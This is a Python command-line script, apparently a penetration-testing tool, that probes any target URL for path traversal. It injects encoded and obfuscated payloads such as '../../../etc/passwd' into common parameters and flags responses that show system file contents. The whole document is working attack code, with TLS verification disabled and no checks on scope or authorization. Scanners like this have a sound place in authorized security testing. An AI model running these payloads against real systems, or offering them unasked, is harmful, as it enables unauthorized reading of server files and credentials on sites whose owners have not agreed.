#!/usr/bin/env python3
"""
Path Traversal Scanner
Tests for path traversal vulnerabilities
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc/passwd',
    '.../.../.../etc/passwd',
    '..;/..;/..;/etc/passwd',
]

def scan(target):
    print(f"[*] Path Traversal Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    params = ['file', 'path', 'doc', 'template', 'page', 'view', 'dir', 'folder']
    
    for param in params:
        for payload in PAYLOADS[:4]:
            try:
                r = requests.get(target, params={param: payload}, timeout=10, verify=False)
                if 'root:' in r.text or 'daemon:' in r.text or '[boot loader]' in r.text:
                    print(f"[!] Path traversal: {param}")
                    found.append(param)
            except:
                pass
    
    print("\n" + "="*50)
    print(f"[*] Found {len(found)} issues")
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Path Traversal')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)